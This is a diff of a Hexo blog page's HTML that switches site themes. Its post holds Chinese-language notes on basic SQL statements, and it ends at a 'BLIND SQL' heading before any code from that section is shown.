@@ -1,454 +1,166 @@
-
-
-<!DOCTYPE html>
-<html lang="en" data-default-color-scheme=auto>
-
-
-
-<head>
-  <meta charset="UTF-8">
-  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
-  <link rel="icon" href="/img/favicon.png">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
-  <meta http-equiv="x-ua-compatible" content="ie=edge">
-  
-  <meta name="theme-color" content="#2f4154">
-  <meta name="description" content="">
-  <meta name="author" content="lionel">
-  <meta name="keywords" content="">
-  <meta name="description" content="some ： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657SELECT DISTINCT 列名称 FROM 表名称SELECT Company FROM Orders# Company 列中仅选取唯一不同的值SELECT DISTIN">
+<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0"><title>sql | Hexo</title><meta name="author" content="John Doe"><meta name="copyright" content="John Doe"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="some ： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657SELECT DISTINCT 列名称 FROM 表名称SELECT Company FROM Orders# Company 列中仅选取唯一不同的值SELECT DISTIN">
 <meta property="og:type" content="article">
 <meta property="og:title" content="sql">
 <meta property="og:url" content="http://example.com/2022/01/13/sql/index.html">
 <meta property="og:site_name" content="Hexo">
 <meta property="og:description" content="some ： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657SELECT DISTINCT 列名称 FROM 表名称SELECT Company FROM Orders# Company 列中仅选取唯一不同的值SELECT DISTIN">
 <meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png">
 <meta property="article:published_time" content="2022-01-13T06:29:08.000Z">
 <meta property="article:modified_time" content="2023-01-31T08:34:34.624Z">
 <meta property="article:author" content="John Doe">
 <meta property="article:tag" content="just a little">
-<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2022/01/13/sql/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: 'Copy successfully',
+    error: 'Copy error',
+    noSupport: 'The browser does not support'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: 'Just',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  }
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'sql',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2023-01-31 16:34:34'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
   
-  <title>sql - Hexo</title>
-
-  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css" />
-
-
-  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4/github-markdown.min.css" />
-  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
-
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
   
+    win.getCSS = url => new Promise((resolve, reject) => {
+      const link = document.createElement('link')
+      link.rel = 'stylesheet'
+      link.href = url
+      link.onload = () => resolve()
+      link.onerror = () => reject()
+      document.head.appendChild(link)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
     
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
     
-      
-      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10/styles/github-gist.min.css" />
-    
-  
-
-  
-    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.css" />
-  
-
-
-<!-- 主题依赖的图标库，不要自行修改 -->
-
-<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
-
-
-
-<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
-
-
-<link  rel="stylesheet" href="/css/main.css" />
-
-<!-- 自定义样式保持在最底部 -->
-
-
-  <script id="fluid-configs">
-    var Fluid = window.Fluid || {};
-    var CONFIG = {"hostname":"example.com","root":"/","version":"1.8.12","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname"}},"search_path":"/local-search.xml"};
-  </script>
-  <script  src="/js/utils.js" ></script>
-  <script  src="/js/color-schema.js" ></script>
-<meta name="generator" content="Hexo 5.4.0"></head>
-
-
-<body>
-  <header style="height: 70vh;">
-    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
-  <div class="container">
-    <a class="navbar-brand" href="/">
-      <strong>Fluid</strong>
-    </a>
-
-    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
-            data-target="#navbarSupportedContent"
-            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
-      <div class="animated-icon"><span></span><span></span><span></span></div>
-    </button>
-
-    <!-- Collapsible content -->
-    <div class="collapse navbar-collapse" id="navbarSupportedContent">
-      <ul class="navbar-nav ml-auto text-center">
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/">
-                <i class="iconfont icon-home-fill"></i>
-                Home
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/archives/">
-                <i class="iconfont icon-archive-fill"></i>
-                Archives
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/categories/">
-                <i class="iconfont icon-category-fill"></i>
-                Categories
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/tags/">
-                <i class="iconfont icon-tags-fill"></i>
-                Tags
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/about/">
-                <i class="iconfont icon-user-fill"></i>
-                About
-              </a>
-            </li>
-          
-        
-        
-          <li class="nav-item" id="search-btn">
-            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
-              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
-            </a>
-          </li>
-        
-        
-          <li class="nav-item" id="color-toggle-btn">
-            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
-                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
-          </li>
-        
-      </ul>
-    </div>
-  </div>
-</nav>
-
-    <div class="banner" id="banner" parallax=true
-         style="background: url('/img/default.png') no-repeat center center;
-           background-size: cover;">
-      <div class="full-bg-img">
-        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
-          <div class="page-header text-center fade-in-up">
-            <span class="h2" id="subtitle" title="sql">
-              
-            </span>
-
-            
-              <div class="mt-3">
-  
-  
-    <span class="post-meta">
-      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-      <time datetime="2022-01-13 14:29" pubdate>
-        January 13, 2022 pm
-      </time>
-    </span>
-  
-</div>
-
-<div class="mt-1">
-  
-    <span class="post-meta mr-2">
-      <i class="iconfont icon-chart"></i>
-      5.6k 字
-    </span>
-  
-
-  
-    <span class="post-meta mr-2">
-      <i class="iconfont icon-clock-fill"></i>
-      
-      
-      18 分钟
-    </span>
-  
-
-  
-  
-</div>
-
-            
-          </div>
-
-          
-        </div>
-      </div>
-    </div>
-  </header>
-
-  <main>
-    
-      
-
-<div class="container-fluid nopadding-x">
-  <div class="row nomargin-x">
-    <div class="d-none d-lg-block col-lg-2"></div>
-    <div class="col-lg-8 nopadding-x-md">
-      <div class="container nopadding-x-md" id="board-ctn">
-        <div class="py-5" id="board">
-          <article class="post-content mx-auto">
-            <!-- SEO header -->
-            <h1 style="display: none">sql</h1>
-            
-            <div class="markdown-body">
-              <p>some ：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">DISTINCT</span> 列名称 <span class="hljs-keyword">FROM</span> 表名称<br><span class="hljs-keyword">SELECT</span> Company <span class="hljs-keyword">FROM</span> Orders<br><br># Company 列中仅选取唯一不同的值<br><span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">DISTINCT</span> Company <span class="hljs-keyword">FROM</span> Orders <br><br>#如果只希望选取居住在城市 &quot;Beijing&quot; 中的人，我们需要向 <span class="hljs-keyword">SELECT</span> 语句添加 <span class="hljs-keyword">WHERE</span> 子句：<span class="hljs-keyword">where</span>还可以添加各种运算符控制查询条件<br><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> Persons <span class="hljs-keyword">WHERE</span> City<span class="hljs-operator">=</span><span class="hljs-string">&#x27;Beijing&#x27;</span>，字符加引号，数字不要加<br><br><br><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> Persons <span class="hljs-keyword">WHERE</span> FirstName<span class="hljs-operator">=</span><span class="hljs-string">&#x27;Thomas&#x27;</span> <span class="hljs-keyword">AND</span> LastName<span class="hljs-operator">=</span><span class="hljs-string">&#x27;Carter&#x27;</span><br><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> Persons <span class="hljs-keyword">WHERE</span> firstname<span class="hljs-operator">=</span><span class="hljs-string">&#x27;Thomas&#x27;</span> <span class="hljs-keyword">OR</span> lastname<span class="hljs-operator">=</span><span class="hljs-string">&#x27;Carter&#x27;</span><br><br><span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span>  用于根据指定列队结果进行排序，默认按照升序，降序用   <span class="hljs-keyword">desc</span><br><span class="hljs-keyword">SELECT</span> Company, OrderNumber <span class="hljs-keyword">FROM</span> Orders <span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> Company<br><span class="hljs-keyword">SELECT</span> Company, OrderNumber <span class="hljs-keyword">FROM</span> Orders <span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> Company <span class="hljs-keyword">desc</span><br><br>#向表中插入数据<br><span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> 表名称 <span class="hljs-keyword">VALUES</span> (值<span class="hljs-number">1</span>, 值<span class="hljs-number">2</span>,....)<br>#向表中指定列插入数据<br><span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> table_name (列<span class="hljs-number">1</span>, 列<span class="hljs-number">2</span>,...) <span class="hljs-keyword">VALUES</span> (值<span class="hljs-number">1</span>, 值<span class="hljs-number">2</span>,....)<br><br><br>UPDATE 表名称 <span class="hljs-keyword">SET</span> 列名称 <span class="hljs-operator">=</span> 新值 <span class="hljs-keyword">WHERE</span> 列名称 <span class="hljs-operator">=</span> 某值<br>UPDATE Person <span class="hljs-keyword">SET</span> Address <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;Zhongshan 23&#x27;</span>, City <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;Nanjing&#x27;</span><br><span class="hljs-keyword">WHERE</span> LastName <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;Wilson&#x27;</span><br><br><br><span class="hljs-keyword">DELETE</span> <span class="hljs-keyword">FROM</span> Person <span class="hljs-keyword">WHERE</span> LastName <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;Wilson&#x27;</span> <br>#可以在不删除表的情况下删除所有的行。这意味着表的结构、属性和索引都是完整的：<br><span class="hljs-keyword">DELETE</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> table_name<br><br><br><span class="hljs-keyword">where</span> city <span class="hljs-keyword">like</span> <span class="hljs-comment">-----筛选列中的元素</span><br><span class="hljs-keyword">where</span> city <span class="hljs-keyword">not</span> <span class="hljs-keyword">like</span> <span class="hljs-comment">-----模糊查找</span><br><span class="hljs-operator">%</span>代表<span class="hljs-number">0</span>个或者多个字符<br>_代表一个字符<br>[charlist]字符列中任何一个字符<br>[<span class="hljs-operator">^</span>charlist]不在字符列中的任何字符<br><br><br><span class="hljs-keyword">between</span>:<br><span class="hljs-keyword">SELECT</span> column_name(s) <span class="hljs-keyword">FROM</span> table_name <span class="hljs-keyword">WHERE</span> column_name <span class="hljs-keyword">BETWEEN</span> value1 <span class="hljs-keyword">AND</span> value2<br>#范围之外：<br><span class="hljs-keyword">SELECT</span> column_name(s) <span class="hljs-keyword">FROM</span> table_name <span class="hljs-keyword">WHERE</span> column_name <span class="hljs-keyword">not</span> <span class="hljs-keyword">BETWEEN</span> value1 <span class="hljs-keyword">AND</span> value2<br><br><br>#换别名显示：<br><span class="hljs-keyword">SELECT</span> column_name(s) <span class="hljs-keyword">FROM</span> table_name <span class="hljs-keyword">AS</span> alias_name<br><span class="hljs-keyword">SELECT</span> column_name <span class="hljs-keyword">AS</span> alias_name <span class="hljs-keyword">FROM</span> table_name<br><br><br>#从两个表中查询信息并显示在一起，最后一行使俩id相等显示<br><span class="hljs-keyword">SELECT</span> Persons.LastName, Persons.FirstName, Orders.OrderNo<br><span class="hljs-keyword">FROM</span> Persons, Orders<br><span class="hljs-keyword">WHERE</span> Persons.Id_P <span class="hljs-operator">=</span> Orders.Id_P <br><br></code></pre></td></tr></table></figure>
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 5.4.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">9</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">3</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">2</div></a></div><hr/></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><span id="blog-info"><a href="/" title="Hexo"><span class="site-name">Hexo</span></a></span><div id="menus"><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">sql</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2022-01-13T06:29:08.000Z" title="Created 2022-01-13 14:29:08">2022-01-13</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2023-01-31T08:34:34.624Z" title="Updated 2023-01-31 16:34:34">2023-01-31</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/self-study/">self study</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="sql"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post View:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p>some ：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">DISTINCT</span> 列名称 <span class="keyword">FROM</span> 表名称</span><br><span class="line"><span class="keyword">SELECT</span> Company <span class="keyword">FROM</span> Orders</span><br><span class="line"></span><br><span class="line"># Company 列中仅选取唯一不同的值</span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">DISTINCT</span> Company <span class="keyword">FROM</span> Orders </span><br><span class="line"></span><br><span class="line">#如果只希望选取居住在城市 &quot;Beijing&quot; 中的人，我们需要向 <span class="keyword">SELECT</span> 语句添加 <span class="keyword">WHERE</span> 子句：<span class="keyword">where</span>还可以添加各种运算符控制查询条件</span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> Persons <span class="keyword">WHERE</span> City<span class="operator">=</span><span class="string">&#x27;Beijing&#x27;</span>，字符加引号，数字不要加</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> Persons <span class="keyword">WHERE</span> FirstName<span class="operator">=</span><span class="string">&#x27;Thomas&#x27;</span> <span class="keyword">AND</span> LastName<span class="operator">=</span><span class="string">&#x27;Carter&#x27;</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> Persons <span class="keyword">WHERE</span> firstname<span class="operator">=</span><span class="string">&#x27;Thomas&#x27;</span> <span class="keyword">OR</span> lastname<span class="operator">=</span><span class="string">&#x27;Carter&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">order</span> <span class="keyword">by</span>  用于根据指定列队结果进行排序，默认按照升序，降序用   <span class="keyword">desc</span></span><br><span class="line"><span class="keyword">SELECT</span> Company, OrderNumber <span class="keyword">FROM</span> Orders <span class="keyword">ORDER</span> <span class="keyword">BY</span> Company</span><br><span class="line"><span class="keyword">SELECT</span> Company, OrderNumber <span class="keyword">FROM</span> Orders <span class="keyword">ORDER</span> <span class="keyword">BY</span> Company <span class="keyword">desc</span></span><br><span class="line"></span><br><span class="line">#向表中插入数据</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> 表名称 <span class="keyword">VALUES</span> (值<span class="number">1</span>, 值<span class="number">2</span>,....)</span><br><span class="line">#向表中指定列插入数据</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> table_name (列<span class="number">1</span>, 列<span class="number">2</span>,...) <span class="keyword">VALUES</span> (值<span class="number">1</span>, 值<span class="number">2</span>,....)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">UPDATE 表名称 <span class="keyword">SET</span> 列名称 <span class="operator">=</span> 新值 <span class="keyword">WHERE</span> 列名称 <span class="operator">=</span> 某值</span><br><span class="line">UPDATE Person <span class="keyword">SET</span> Address <span class="operator">=</span> <span class="string">&#x27;Zhongshan 23&#x27;</span>, City <span class="operator">=</span> <span class="string">&#x27;Nanjing&#x27;</span></span><br><span class="line"><span class="keyword">WHERE</span> LastName <span class="operator">=</span> <span class="string">&#x27;Wilson&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">DELETE</span> <span class="keyword">FROM</span> Person <span class="keyword">WHERE</span> LastName <span class="operator">=</span> <span class="string">&#x27;Wilson&#x27;</span> </span><br><span class="line">#可以在不删除表的情况下删除所有的行。这意味着表的结构、属性和索引都是完整的：</span><br><span class="line"><span class="keyword">DELETE</span> <span class="operator">*</span> <span class="keyword">FROM</span> table_name</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">where</span> city <span class="keyword">like</span> <span class="comment">-----筛选列中的元素</span></span><br><span class="line"><span class="keyword">where</span> city <span class="keyword">not</span> <span class="keyword">like</span> <span class="comment">-----模糊查找</span></span><br><span class="line"><span class="operator">%</span>代表<span class="number">0</span>个或者多个字符</span><br><span class="line">_代表一个字符</span><br><span class="line">[charlist]字符列中任何一个字符</span><br><span class="line">[<span class="operator">^</span>charlist]不在字符列中的任何字符</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">between</span>:</span><br><span class="line"><span class="keyword">SELECT</span> column_name(s) <span class="keyword">FROM</span> table_name <span class="keyword">WHERE</span> column_name <span class="keyword">BETWEEN</span> value1 <span class="keyword">AND</span> value2</span><br><span class="line">#范围之外：</span><br><span class="line"><span class="keyword">SELECT</span> column_name(s) <span class="keyword">FROM</span> table_name <span class="keyword">WHERE</span> column_name <span class="keyword">not</span> <span class="keyword">BETWEEN</span> value1 <span class="keyword">AND</span> value2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#换别名显示：</span><br><span class="line"><span class="keyword">SELECT</span> column_name(s) <span class="keyword">FROM</span> table_name <span class="keyword">AS</span> alias_name</span><br><span class="line"><span class="keyword">SELECT</span> column_name <span class="keyword">AS</span> alias_name <span class="keyword">FROM</span> table_name</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#从两个表中查询信息并显示在一起，最后一行使俩id相等显示</span><br><span class="line"><span class="keyword">SELECT</span> Persons.LastName, Persons.FirstName, Orders.OrderNo</span><br><span class="line"><span class="keyword">FROM</span> Persons, Orders</span><br><span class="line"><span class="keyword">WHERE</span> Persons.Id_P <span class="operator">=</span> Orders.Id_P </span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
 <p>BLIND SQL:</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span 